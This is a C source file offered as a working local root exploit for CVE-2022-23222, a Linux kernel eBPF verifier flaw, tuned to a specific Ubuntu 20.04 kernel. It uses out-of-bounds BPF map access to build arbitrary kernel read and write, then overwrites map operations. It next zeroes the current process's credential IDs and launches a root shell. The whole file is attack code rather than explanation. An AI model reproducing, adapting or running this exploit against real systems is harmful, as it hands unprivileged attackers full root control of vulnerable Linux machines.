/**
    exploit for CVE-2022-23222

    author: Matan Liber

    tested with correct symbols for ubuntu 20.04 kernel version 5.13.0-27-generic
*/

#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <linux/bpf.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>

#include "bpf.h"
#include "exploit.h"

#include <bpf/libbpf.h>
#include <errno.h>
#include <string.h>

char oob_read_buff[0x1000];

int map_fds[0x100];
uint64_t map_values[0x100];
int map_fds_size = 0;

struct old_values {
    int spin_lock;
    uint32_t max_entries;
    uint32_t map_type;
} old_values;

uint64_t random_value()
{
    int randomData = open("/dev/urandom", O_RDONLY);
    if (randomData < 0)
    {
        exit(0);
    }
    else
    {
        uint64_t myRandomData;
        ssize_t result = read(randomData, &myRandomData, sizeof(myRandomData));
        if (result < 0)
        {
            exit(0);
        }
        return myRandomData;
    }
    return 0;
}

int create_vuln_map(exploit_context* pCtx)
{
    int map = -1;
    union bpf_attr map_attrs =
    {
            .map_type = BPF_MAP_TYPE_ARRAY,
            .key_size = 4,
            .value_size = DATA_SIZE,
            .max_entries = 1,
    };
    map = create_map(&map_attrs);
    if(map < 0)
    {
        printf("[-] failed to create array map!\n");
        return -1;
    }
    printf("[+] created map %d\n", map_fds_size+1);
    char vals[DATA_SIZE] = {0};
    uint64_t value = random_value();
    *(uint64_t *)(vals) = value;
    printf("[+] generated random value: %llx\n", value);
    if(0 != update_map_element(map, 0, vals, BPF_ANY))
    {
        printf("[-] failed to update map element values!\n");
        return -1;
    }
    map_fds[map_fds_size] = map;
    map_values[map_fds_size++] = value;

    return map;
}

int create_ab_maps(exploit_context* pCtx)
{
    int a_map,b_map;

    a_map = create_vuln_map(pCtx);
    if(-1 == a_map)
    {
        printf("[-] failed to update map element values!\n");
        return -1;
    }

    b_map = create_vuln_map(pCtx);
    if(-1 == b_map)
    {
        printf("[-] failed to update map element values!\n");
        return -1;
    }

    pCtx->a_fd = a_map;
    pCtx->b_fd = b_map;

    return 0;
}

int create_ringbuf_map(exploit_context* pCtx)
{
    int ringbuf_map_fd = -1;

    union bpf_attr map_attrs =
    {
        .map_type = 27,
        .key_size = 0,
        .value_size = 0,
        .max_entries = 4096,
    };

    ringbuf_map_fd = create_map(&map_attrs);

    if(ringbuf_map_fd < 0)
    {
        printf("[-] failed to create ringbuf map!\n");
        return -1;
    }

    pCtx->ringbuf_map_fd = ringbuf_map_fd;

    return 0;
}

int oob_write(exploit_context* pCtx, int map_fd, char* buff, uint32_t size)
{
    struct bpf_insn insn[] =
    {
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

        get_invalid_pointer(pCtx->ringbuf_map_fd, BPF_REG_7, size),
        get_map_value_pointer(map_fd, 0, BPF_REG_9),

        BPF_MOV64_REG(BPF_REG_1, BPF_REG_8),    // skb
        BPF_MOV64_IMM(BPF_REG_2, 0),            // offset zero into skb
        BPF_MOV64_REG(BPF_REG_3, BPF_REG_9),    // map_value_ptr
        BPF_MOV64_REG(BPF_REG_4, BPF_REG_7),    // invalid size
        BPF_EMIT_CALL(BPF_SKB_LOAD_BYTES),      // call skb_load_bytes

        BPF_MOV64_IMM(BPF_REG_0, 0),
        BPF_EXIT_INSN()
    };

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL, buff, size))
    {
        printf("[-] failed to run eBPF program!\n");
        return -1;
    }

   return 0;
}

static int buf_process_ringbuf_read(void *ctx, void *data, size_t len) {
    memcpy(oob_read_buff, data, len);
    return 0;

}

int oob_read(exploit_context* pCtx, int map_fd)
{
     struct bpf_insn insn[] =
     {
        BPF_MOV64_REG(BPF_REG_8, BPF_REG_1),

        get_invalid_pointer(pCtx->ringbuf_map_fd, BPF_REG_7, CACHE_SIZE + 8),
        get_map_value_pointer(map_fd, 0, BPF_REG_9),

         BPF_LD_MAP_FD(BPF_REG_1, pCtx->ringbuf_map_fd),  // ringbuf ptr
         BPF_MOV64_REG(BPF_REG_2, BPF_REG_9),             // map value ptr
         BPF_MOV64_REG(BPF_REG_3, BPF_REG_7),             // invalid size
         BPF_MOV64_IMM(BPF_REG_4, 0),                     // flags
         BPF_EMIT_CALL(BPF_RINGBUF_OUTPUT),               // call bpf_ringbuf_output

         BPF_MOV64_IMM(BPF_REG_0, 0),
         BPF_EXIT_INSN()
     };

    struct ring_buffer *ring_buffer;

    ring_buffer = ring_buffer__new(pCtx->ringbuf_map_fd, buf_process_ringbuf_read, NULL, NULL);
    if(!ring_buffer) {
        fprintf(stderr, "failed to create ring buffer\n");
        return -1;
    }

    if(0 != run_bpf_prog(insn, sizeof(insn) / sizeof(insn[0]), NULL, NULL, 0))
    {
        printf("[-] failed to run eBPF program!\n");
        return -1;
    }

    ring_buffer__consume(ring_buffer);
    sleep(1);

    return 0;
}

int is_aligned(uint64_t value, int remove)
{
    int fd;
    for (int i=0; i < map_fds_size; i++)
    {
        if (map_values[i] == value)
        {
            printf("[+] aligned map found in map %d\n", i);
            fd = map_fds[i];
            if (remove == 1)
            {
                map_fds[i] = -1;
            }
            return fd;
        }
    }
    return -1;
}

int close_unused()
{
    printf("[+] closing unnecessary_maps \n");
    for (int i=0; i < map_fds_size; i++)
    {
//        printf("closing: %d val: %d\n", i, map_fds[i]);
        close(map_fds[i]);
    }
}

int are_maps_good(exploit_context* pCtx)
{
    int fd;
    uint64_t val;
    oob_read(pCtx, pCtx->a_fd);
    val = *(uint64_t *)(oob_read_buff + CACHE_SIZE);
    printf("[+] value read from slab: %llx\n", val);
    fd = is_aligned(val, 1);
    if (fd != -1)
    {
        pCtx->b_fd = fd;
        map_fds[map_fds_size-2] = -1;
        return 1;
    }
    oob_read(pCtx, pCtx->b_fd);
    val = *(uint64_t *)(oob_read_buff + CACHE_SIZE);
    printf("[+] value read from slab: %llx\n", val);
    fd = is_aligned(val, 1);
    if(fd != -1)
    {
        pCtx->a_fd = pCtx->b_fd;
        pCtx->b_fd = fd;
        map_fds[map_fds_size-1] = -1;
        return 1;
    }
    return 0;
}

int get_good_maps(exploit_context* pCtx){

    printf("[!] staring to create new maps until we get two consecutive maps\n");

    if(0 != create_ab_maps(pCtx))
    {
        printf("[-] failed to create two new maps!\n");
        return;
    }

    printf("[+] two new maps created!\n");

    for (int i=0; i<100; i++)
    {
        if (are_maps_good(pCtx))
        {
            uint64_t val;
            val = *(uint64_t *)(oob_read_buff);
            printf("1: %llx\n", val);
            val = *(uint64_t *)(oob_read_buff + CACHE_SIZE);
            printf("2: %llx\n", val);
            close_unused();
            return 0;
        }
        else {
            if(0 != create_ab_maps(pCtx))
            {
                printf("[-] failed to create bpf maps!\n");
                close_unused();
                return -1;
            }

            printf("[+] eBPF enabled, maps created!\n");
        }
    }
    close_unused();
    return -1;
}

uint64_t arbitrary_read32(exploit_context* pCtx, uint32_t * out, uint64_t addr)
{
    uint64_t * val = oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_BTF_OFFSET;
    *val = addr - BTF_ID_OFFSET;
    oob_write(pCtx, pCtx->a_fd, oob_read_buff, CACHE_SIZE + 8);
    if (obj_get_info_by_fd(pCtx->b_fd, out)) {
        puts("read fail");
        return -1;
    }
    return 0;
}

uint64_t arbitrary_read(exploit_context* pCtx, uint64_t* out, uint64_t addr)
{
    uint32_t lo, hi;
    if (arbitrary_read32(pCtx, &lo, addr) != 0)
    {
        return -1;
    }

    if (arbitrary_read32(pCtx, &hi, addr+4) != 0)
    {
        return -1;
    }

    *out =  (((uint64_t)hi) << 32) | lo;
    return 0;
}

int override_ops(exploit_context* pCtx)
{
    uint64_t array_map_ops = *(uint64_t*) (oob_read_buff + OFFSET_TO_NEXT_MAP);
    uint64_t mutex_wait_list = *(uint64_t*) (oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_MUTEX_WAIT_LIST_OFFSET);
    uint64_t map_addr = mutex_wait_list - MAP_MUTEX_WAIT_LIST_OFFSET;

    printf("[+] found map address: 0x%llx\n", map_addr);

    uint64_t data;
    uint64_t *oob_read_uint_ptr = (uint64_t *)oob_read_buff;
    printf("[+] overriding map_ops\n");
    for(int i=0; i<DATA_SIZE/8; i++){
        if(arbitrary_read(pCtx, &data, array_map_ops + i*8) != 0)
        {
            return 1;
        }
        oob_read_uint_ptr[i] = data;
    }
    pCtx->kernel_slide = oob_read_uint_ptr[4] - ARRAY_MAP_GET_NEXT_KEY;
    printf("[+] detected kernel slide %llx\n", pCtx->kernel_slide);
    oob_read_uint_ptr[14] = oob_read_uint_ptr[4]; // set map_push_elem = map_get_next_key
    *(uint64_t*) (oob_read_buff + OFFSET_TO_NEXT_MAP) = map_addr - OFFSET_TO_NEXT_MAP;

    //spin_lock
    printf("[+] setting spin_lock = 0\n");
    int *spin_lock_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_SPIN_LOCK_OFF_OFFSET);
    old_values.spin_lock = *spin_lock_ptr;
    *spin_lock_ptr = 0;

    // max_entries
    printf("[+] setting max_entries = 0xffffffff\n");
    uint32_t *max_entries_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_MAX_ENTRIES_OFFSET);
    old_values.max_entries = *max_entries_ptr;
    *max_entries_ptr = 0xffffffff;

    // map_type
    printf("[+] setting map_type = BPF_MAP_TYPE_STACK\n");
    uint32_t *map_type_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_MAP_TYPE_OFFSET);
    old_values.map_type = *map_type_ptr;
    *map_type_ptr = BPF_MAP_TYPE_STACK;


    if (0 !=oob_write(pCtx, pCtx->a_fd, oob_read_buff, CACHE_SIZE + 8))
    {
        return 1;
    }

    return 0;
}

void write32(exploit_context* pCtx, size_t addr, uint32_t data)
{
    uint64_t key = 0;
    data -= 1;
    if (bpf_update_elem(pCtx->b_fd, &key, &data, addr)) {
        printf("bpf_update_elem failed '%s'\n", strerror(errno));
        return;
    }
}
void write64(exploit_context* pCtx, size_t addr, size_t data)
{
    uint32_t lo = data & 0xffffffff;
    uint32_t hi = (data & 0xffffffff00000000) >> 32;
    uint64_t key = 0;
    write32(pCtx, addr, lo);
    write32(pCtx, addr+4, hi);
}

get_root(exploit_context* pCtx){
    size_t init_pid_ns = INIT_PID_NS + pCtx->kernel_slide;
    pid_t pid = getpid();
    size_t  task_addr;
    if (arbitrary_read(pCtx, &task_addr, init_pid_ns + NS_TASK_STRUCT_OFFSET) != 0)
    {
        return -1;
    }
    size_t cred_addr = 0;
    pid_t p;
    puts("[+] iterating over task_struct list to find out process");
    for(int i=0;i<1000;i++) {
        if (arbitrary_read32(pCtx, &p, task_addr + TASK_STRUCT_PID_OFFSET) != 0)
        {
            return -1;
        }

        if(p == pid)
        {
            puts("[+] got it!");
            if (arbitrary_read(pCtx, &cred_addr, task_addr + TASK_STRUCT_CRED_OFFSET) != 0)
            {
                return -1;
            }
            break;
        }
        else
        {
            if (arbitrary_read(pCtx, &task_addr, task_addr + TASK_STRUCT_NEXT_OFFSET) != 0)
            {
                return -1;
            }
            task_addr -= TASK_STRUCT_NEXT_OFFSET;
        }
    }

    if(cred_addr==0) {
        printf("failed getting cred_addr\n");
        return -1;
    }

    write32(pCtx, cred_addr+4, 0);
    write64(pCtx, cred_addr+8, 0);
    write64(pCtx, cred_addr+16, 0);
    return 0;
}

int cleanup(exploit_context* pCtx)
{
    uint64_t* val = oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_BTF_OFFSET;
    *val = 0;

    //spin_lock
    int *spin_lock_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_SPIN_LOCK_OFF_OFFSET);
    *spin_lock_ptr = old_values.spin_lock;

    // max_entries
    uint32_t *max_entries_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_MAX_ENTRIES_OFFSET);
    *max_entries_ptr = old_values.max_entries;

    // map_type
    uint32_t *map_type_ptr = (int *)(oob_read_buff + OFFSET_TO_NEXT_MAP + MAP_MAP_TYPE_OFFSET);
    *map_type_ptr = old_values.map_type;

    oob_write(pCtx, pCtx->a_fd, oob_read_buff, CACHE_SIZE + 8);

    close(pCtx->a_fd);
    close(pCtx->b_fd);
}

int main(int argc, char **argv)
{
    exploit_context ctx = {0};

    if(0 != create_ringbuf_map(&ctx))
    {
        printf("[-] failed to create ringbuf map!\n");
        goto done;
    }

    printf("[+] eBPF enabled, ringbuf created!\n");

    if (0 != get_good_maps(&ctx))
    {
        goto done;
    }

    if (0 != override_ops(&ctx)){
        goto done;
    }

    puts("[+] getting root");
    if (0 != get_root(&ctx)){
        goto done;
    }

    if(getuid() == 0)
    {
        puts("[+] cleaning up");
        cleanup(&ctx);
        puts("[+] getting shell!");
        system("/bin/sh");
        return 0;
    }


done:
    puts("[+] cleaning up");
    cleanup(&ctx);
    return 0;
}
